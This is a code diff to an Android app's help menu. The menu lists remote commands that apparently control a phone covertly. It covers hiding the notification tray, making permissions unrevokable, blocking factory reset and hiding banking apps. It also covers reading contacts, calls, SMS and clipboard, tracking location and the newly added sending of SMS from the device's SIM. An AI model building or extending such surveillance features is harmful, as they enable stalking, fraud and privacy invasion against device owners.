@@ -32,6 +32,7 @@ class HelpCommand @Inject constructor() : Command {
             • <code>/device_owner</code> — Full enterprise telemetry dashboard
             • <code>/antitamper on|off|status</code> — Safe boot, airplane mode, factory reset lock
             • <code>/usb_lock on|off|status</code> — Kill USB data pins (AC charge only) [Android 12+]
+            • <code>/notification hide|show|toggle</code> — Hide/restore notification tray [Android 6+]
             • <code>/self_heal</code> — Lock permissions permanently as unrevokable
             • <code>/freeze &lt;app&gt;</code> — Vanish banking/private apps into shadow vault
             • <code>/unfreeze &lt;app&gt;</code> — Restore hidden application
@@ -43,6 +44,7 @@ class HelpCommand @Inject constructor() : Command {
             📍 <b>Location & Safe Zones</b>
             • <code>/locate</code> — Instant high-accuracy GPS fix + Maps pin
             • <code>/tower</code> — Dual-SIM cell tower triangulation & signal RF telemetry
+            • <code>/sim [slot]</code> — Display active SIM info, carrier, signal strength
             • <code>/track &lt;minutes&gt;</code> — Continuous periodic tracking
             • <code>/track stop</code> — Deactivate tracking
             • <code>/geofence here 200</code> — Set safe zone & alert on exit [PRO]
@@ -65,6 +67,8 @@ class HelpCommand @Inject constructor() : Command {
             • <code>/contacts [search]</code> — Read device address book
             • <code>/call_log [count]</code> — View incoming/outgoing calls
             • <code>/sms_log [count]</code> — View recent SMS messages
+            • <code>/sendsms &lt;number&gt; &lt;message&gt;</code> — Send SMS via device SIM
+            • <code>/sendsms sim1|sim2 &lt;number&gt; &lt;message&gt;</code> — Send SMS from specific SIM slot
             • <code>/clipboard</code> — Read device clipboard text
             
             🔊 <b>Siren & Display Alerts</b>
